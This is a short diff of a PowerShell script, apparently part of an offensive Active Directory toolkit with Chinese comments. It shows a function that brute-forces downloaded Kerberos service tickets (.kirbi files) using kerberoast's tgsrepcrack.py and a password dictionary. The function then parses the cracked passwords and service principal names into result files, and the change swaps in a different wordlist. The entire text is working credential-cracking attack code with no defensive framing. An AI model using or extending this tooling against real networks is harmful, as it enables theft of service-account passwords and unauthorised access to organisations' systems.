@@ -127,8 +127,7 @@ function Get-ServiceTicket{
 # 引入tgscrack来爆破下载下来的凭据
 function Crack-ServiceTicket{
 	Write-Host "正在爆破中ing.......请稍等"
-	# $tgsCrackResult = python27 .\kerberoast\tgsrepcrack.py .\Dicts\GaiaPasswd.txt .\*.kirbi
-	python27 .\kerberoast\tgsrepcrack.py .\Dicts\GaiaPasswd.txt .\*.kirbi | Tee-Object -Variable tgsCrackResult
+	python27 .\kerberoast\tgsrepcrack.py .\Dicts\JCPasswd.txt .\*.kirbi | Tee-Object -Variable tgsCrackResult
 	$passwdAndSPN = $tgsCrackResult | %{ if ($_.contains("found")){ $_}}|%{$_.split(" ")[5] + "#" +$_.split(" ")[-1].split("~")[0].split("@")[-1] + "/" + $_.split(" ")[-1].split("~")[-1].substring(0,($_.split(" ")[-1].split("~")[-1].lastindexof("-")))}
 	# 
 	if((Test-Path '.\result\sucSPNList.txt') -and (Test-Path ".\result\sucUserList.txt")){
